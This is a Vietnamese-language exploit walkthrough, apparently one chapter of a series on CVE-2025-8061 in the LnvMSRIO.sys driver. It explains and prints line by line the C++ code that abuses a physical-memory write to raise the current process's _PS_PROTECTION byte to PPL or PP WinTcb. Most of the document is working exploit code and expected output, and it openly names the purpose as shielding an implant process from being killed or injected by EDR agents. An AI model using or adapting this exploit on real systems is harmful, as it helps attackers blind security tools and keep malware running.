# 13 — Self PPL Elevation (_PS_PROTECTION Write)

**File:** `13_ppl_elevate.cpp`  
**CVE:** CVE-2025-8061 (LnvMSRIO.sys)  
**Primitive dùng:** Physical write (1 byte) + APL VA walk  
**Output:** Process hiện tại trở thành PPL WinTcb hoặc PP WinTcb — immune với PROCESS_TERMINATE và PROCESS_VM_WRITE từ EDR agents

---

## Mục tiêu

Ghi `_PS_PROTECTION` byte tại `EPROCESS+0x87A` của process hiện tại để tự elevate thành Protected Process Light (PPL) hoặc Protected Process (PP). Sau khi set, EDR agents không thể kill hoặc inject vào process này — chúng nhận `ACCESS_DENIED` khi cố gọi `OpenProcess(PROCESS_TERMINATE, ...)`.

---

## Lý thuyết nền

### _PS_PROTECTION byte encoding

```
byte tại EPROCESS+0x87A:
    bits[2:0]  Type    0=None, 1=ProtectedLight (PPL), 2=Protected (PP)
    bit[3]     Audit   gần như không dùng
    bits[7:4]  Signer  0=None, 1=Authenticode, 2=CodeGen, 3=Antimalware,
                       4=Lsa, 5=Windows, 6=WinTcb, 7=WinSystem

Giá trị quan trọng:
    0x00 = unprotected         (Type=None, Signer=None)
    0x31 = PPL Antimalware     (Type=PPL, Signer=3)  — Windows Defender level
    0x41 = PPL Lsa             (Type=PPL, Signer=4)
    0x51 = PPL Windows         (Type=PPL, Signer=5)
    0x61 = PPL WinTcb          (Type=PPL, Signer=6)  ← highest PPL
    0x62 = PP  WinTcb          (Type=PP, Signer=6)   ← csrss.exe, services.exe level
    0x72 = PP  WinSystem       (Type=PP, Signer=7)   ← chỉ dành cho System process
```

### Tác dụng của PPL/PP

Khi process có Protection ≥ PPL WinTcb (0x61):
- `OpenProcess(PROCESS_TERMINATE)` từ non-PP/PPL process → `STATUS_ACCESS_DENIED`
- `OpenProcess(PROCESS_VM_WRITE)` → `STATUS_ACCESS_DENIED`
- `OpenProcess(PROCESS_CREATE_THREAD)` → `STATUS_ACCESS_DENIED`
- EDR agent (thường chạy unprotected hoặc PPL Antimalware 0x31) không thể kill process

Kẻ tấn công dùng kỹ thuật này để bảo vệ implant process khỏi bị EDR terminate.

### PatchGuard risk

PatchGuard **có thể** verify `_PS_PROTECTION` trên một số build (không phải tất cả). Window an toàn: càng ngắn càng tốt. Code implement **30-second auto-restore** với early-exit khi user nhấn Enter.

**Khuyến nghị thực tế**: set PPL → làm ngay tác vụ cần protect → clear PPL. Không để lâu.

### FindEprocessByPid() — tại sao phức tạp hơn các file khác?

File 01–06 tìm EPROCESS bằng physical scan. Nhưng ở đây ta cần **VA** của EPROCESS (không phải PA) để:
1. Tính `prot_va = eproc_va + 0x87A`
2. Gọi `VaToPa(cr3, prot_va)` để lấy physical address của byte Protection

Solution: scan vật lý → tìm System EPROCESS PA → đọc `APL.Flink` (kernel VA) từ PA → walk APL chain qua kernel VA (dùng VaToPa cho từng hop).

---

## Giải thích code từng dòng

### ProtString() — decode protection byte cho display

```cpp
static const char *ProtString(uint8_t b)
{
    uint8_t type   = b & 0x7;          // bits[2:0]
    uint8_t signer = (b >> 4) & 0xF;  // bits[7:4]
    static char buf[64];
    const char *types[]   = {"None","PPL","PP","?3","?4","?5","?6","?7"};
    const char *signers[] = {"None","Authenticode","CodeGen","Antimalware",
                              "Lsa","Windows","WinTcb","WinSystem"};
    snprintf(buf, sizeof(buf), "0x%02X (%s/%s)", b, types[type], signers[signer]);
    return buf;
}
// Ví dụ: ProtString(0x61) → "0x61 (PPL/WinTcb)"
//         ProtString(0x62) → "0x62 (PP/WinTcb)"
//         ProtString(0x00) → "0x00 (None/None)"
```

### Command-line argument: target protection level

```cpp
uint8_t target_prot = 0x61;  // default: PPL WinTcb
if (argc >= 2) {
    unsigned long v = strtoul(argv[1], nullptr, 16);
    // Parse hex string, e.g. argv[1] = "0x62" → v = 98 = 0x62
    target_prot = (uint8_t)(v & 0xFF);
}
// Usage: 13_ppl_elevate.exe 0x62   → PP WinTcb
//        13_ppl_elevate.exe 0x31   → PPL Antimalware
//        (no arg)                  → PPL WinTcb (0x61)
```

### FindEprocessByPid() — Phase 1: tìm System EPROCESS PA

```cpp
for (uint64_t pa = 0x100000; pa < top && !system_eproc; pa += 1<<20) {
    if (pa >= 0xC0000000ULL && pa < 0x100000000ULL) continue;
    // Read 1MB chunk
    for (DWORD pg = 0; pg < (1u<<20); pg += 0x1000)
        PhysRead(pa+pg, buf+pg, 0x1000);
    
    for (DWORD off = 0; off + 0x5B8 <= (1u<<20); off += 8) {
        if (*(ULONG_PTR*)(buf+off+0x440) != 4) continue;          // PID = 4 (System)
        if (_strnicmp((char*)(buf+off+0x5A8), "System", 6) != 0) continue;
        uint64_t c = *(uint64_t*)(buf+off+0x028);
        if (!c || (c & 0xFFF)) continue;  // CR3 phải align 4KB
        
        system_eproc = pa + off;  // physical address của System EPROCESS
        break;
    }
}
```

`system_eproc` là **PA** (physical address), không phải VA.

### Phase 2: đọc APL.Flink từ PA

```cpp
uint64_t apl_flink = 0;
PhysReadU64(system_eproc + 0x448, &apl_flink);
// System EPROCESS+0x448 = ActiveProcessLinks.Flink = kernel VA của next EPROCESS's links
```

`apl_flink` là một **kernel VA** (0xFFFF8...). Ta dùng PA của System EPROCESS để đọc field này, nhưng value đọc ra là kernel VA.

### Phase 3: walk APL chain qua VaToPa

```cpp
uint64_t cur_apl_va = apl_flink;  // kernel VA của System->APL.Flink target

for (int i = 0; i < 1024; i++) {
    uint64_t eproc_va = cur_apl_va - 0x448;
    // cur_apl_va trỏ đến EPROCESS.ActiveProcessLinks (offset 0x448)
    // → subtract 0x448 để lấy base VA của EPROCESS
    
    uint64_t pid = 0;
    if (!KernelReadU64(cr3, eproc_va + 0x440, &pid)) break;
    // KernelReadU64 → VaToPa(cr3, va) → PhysReadU64(pa)
    
    if ((DWORD)pid == target_pid) {
        return eproc_va;  // found!
    }
    
    uint64_t next_apl_va = 0;
    if (!KernelReadU64(cr3, cur_apl_va, &next_apl_va)) break;
    // Đọc Flink của current APL entry = VA của next EPROCESS's APL
    
    if (next_apl_va == apl_flink) break;  // đã loop về System → không tìm thấy
    cur_apl_va = next_apl_va;
}
```

Limit 1024 iterations để tránh infinite loop nếu list bị corrupt.

### Đọc original Protection byte

```cpp
uint64_t prot_va = eproc_va + 0x87A;        // kernel VA của Protection byte
uint64_t prot_pa = VaToPa(cr3, prot_va);    // → physical address

// Đọc 8-byte aligned block chứa byte này
uint8_t readbuf[8] = {};
PhysRead(prot_pa & ~7ULL, readbuf, 8);
// prot_pa & ~7: round down về 8-byte boundary
// Đọc 8 bytes aligned

orig_byte = readbuf[prot_pa & 7];
// Index trong 8-byte block = prot_pa mod 8
// Lấy đúng byte cần thiết
```

Cách đọc này tránh unaligned access (driver có thể không support unaligned read trên một số system).

### PhysWriteU8() — ghi 1 byte

```cpp
struct PhysWriteIn1 { UINT64 PA; DWORD OT; DWORD AS; UINT8 Data; };

static bool PhysWriteU8(uint64_t pa, uint8_t val)
{
    PhysWriteIn1 in = { pa, 1, 1, val };
    // PA: physical address
    // OT=1: operation type = write
    // AS=1: access size = 1 byte
    // Data: byte value to write
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_WRITE,
                           &in, sizeof(in), nullptr, 0, &got, nullptr) != FALSE;
}
```

Driver IOCTL_PHYS_WRITE với AccessSize=1 thực hiện byte-level write. Điều này critical vì Protection byte nằm chung 8-byte QWORD với các field khác — ghi 8 bytes sẽ corrupt.

### Verify write

```cpp
PhysWriteU8(prot_pa, target_prot);

// Verify: đọc lại 8 bytes, extract byte cụ thể
uint8_t verify = 0;
PhysRead(prot_pa & ~7ULL, readbuf, 8);
verify = readbuf[prot_pa & 7];

if (verify != target_prot) {
    printf("[!] Write did not stick (HVCI?): read back 0x%02X\n", verify);
    return 1;
}
```

### 30-second countdown với non-blocking input check

```cpp
HANDLE hStdin = GetStdHandle(STD_INPUT_HANDLE);
for (int sec = 30; sec > 0; sec--) {
    printf("\r    Restoring in %2d seconds...  ", sec);
    fflush(stdout);
    // \r = carriage return (không newline) → overwrite dòng cũ với countdown
    
    for (int ms = 0; ms < 10; ms++) {
        Sleep(100);  // 100ms × 10 = 1 second per outer loop iteration
        
        DWORD avail = 0;
        PeekNamedPipe(hStdin, nullptr, 0, nullptr, &avail, nullptr);
        // PeekNamedPipe: non-blocking check for available input
        // (hoạt động với stdin console pipe)
        
        if (avail) {
            INPUT_RECORD ir;
            DWORD read = 0;
            if (ReadConsoleInputA(hStdin, &ir, 1, &read) && read) {
                if (ir.EventType == KEY_EVENT &&
                    ir.Event.KeyEvent.bKeyDown &&
                    ir.Event.KeyEvent.uChar.AsciiChar == '\r') {
                    // Enter key → exit countdown immediately
                    sec = 0;
                    break;
                }
            }
        }
    }
    if (sec <= 0) break;
}
```

Tại sao `PeekNamedPipe` + `ReadConsoleInputA` thay vì `getchar()`?

- `getchar()` là blocking — không có timeout
- `PeekNamedPipe` check non-blocking xem có data không
- `ReadConsoleInputA` đọc keyboard event mà không cần newline (tránh buffering)

### Restore ngay sau countdown

```cpp
printf("\n[*] Restoring Protection to %s...\n", ProtString(orig_byte));
PhysWriteU8(prot_pa, orig_byte);  // ghi lại byte gốc (0x00 hoặc 0x31, v.v.)

// Final verify
PhysRead(prot_pa & ~7ULL, readbuf, 8);
verify = readbuf[prot_pa & 7];
printf("[+] Protection restored to %s\n", ProtString(verify));
```

---

## Protection Byte Reference Table

| Value | Type | Signer | Mô tả |
|-------|------|--------|-------|
| 0x00 | None | None | Unprotected (default cho user processes) |
| 0x31 | PPL | Antimalware | Windows Defender, antivirus level |
| 0x41 | PPL | Lsa | LSASS protection (lsass.exe) |
| 0x51 | PPL | Windows | Windows system services |
| 0x61 | PPL | WinTcb | Highest PPL (csrss-adjacent) |
| 0x62 | PP | WinTcb | Full Protected Process (csrss.exe, services.exe) |
| 0x72 | PP | WinSystem | System/Secure System only |

---

## Kết quả expected

```
=== CVE-2025-8061 | LnvMSRIO.sys | 13 - Self PPL Elevation ===

[!] WARNING: PatchGuard checks _PS_PROTECTION on some builds.
    Auto-restore is performed after 30 seconds.

[*] Target protection: 0x61 (PPL/WinTcb)
[*] Current PID = 5432

[+] CR3 = 0xFFFF00012AB00000
[+] Own EPROCESS VA = 0xFFFF8880ABCDE000
[+] Original Protection = 0x00 (None/None)

[*] Elevating to 0x61 (PPL/WinTcb)...
[+] Protection set to 0x61 (PPL/WinTcb)

[+] This process is now protected:
    - OpenProcess(PROCESS_TERMINATE) from non-PP/PPL will fail
    - OpenProcess(PROCESS_VM_WRITE)  from non-PP/PPL will fail
    - EDR agents running at lower protection cannot kill this process

[*] Auto-restoring in 30 seconds. Press Enter to restore immediately.

    Restoring in 28 seconds...

[*] Restoring Protection to 0x00 (None/None)...
[+] Protection restored to 0x00 (None/None)
[+] Done.
```

---

## Stability

| Vấn đề | Mức độ |
|--------|--------|
| **PatchGuard** | **RISKY** — PG có thể verify Protection trên một số build → BSOD |
| **HVCI** | Không ảnh hưởng — EPROCESS không ở trong HV-protected pages |
| Window an toàn | < vài giây lý tưởng; code dùng 30s với early exit |
| Phát hiện bởi EDR | Một số EDR detect process tự-elevate PPL qua kernel telemetry |
| EDR đã ở PP level | Nếu EDR là PP WinTcb trở lên, OpenProcess của nó vẫn succeed |

---

## Tóm tắt flow

```
Parse argv[1] → target_prot (default 0x61)

GetSystemCR3() → cr3

GetCurrentProcessId() → my_pid

FindEprocessByPid(cr3, my_pid):
    Phase 1: physical scan → System EPROCESS PA
    Phase 2: PhysReadU64(system_pa + 0x448) → apl_flink (kernel VA)
    Phase 3: walk APL via VaToPa:
        cur = apl_flink
        loop 1024×:
            eproc_va = cur - 0x448
            KernelReadU64(eproc_va + 0x440) → pid
            if pid == my_pid → return eproc_va
            KernelReadU64(cur) → next apl VA
    → eproc_va

prot_va = eproc_va + 0x87A
prot_pa = VaToPa(cr3, prot_va)

PhysRead(prot_pa & ~7, 8 bytes) → orig_byte = byte at prot_pa%8
PhysWriteU8(prot_pa, target_prot=0x61)
PhysRead verify → 0x61 ✓

[+] Process là PPL WinTcb
[+] EDR không thể PROCESS_TERMINATE

30-second countdown (early exit on Enter)

PhysWriteU8(prot_pa, orig_byte=0x00)  ← RESTORE
```
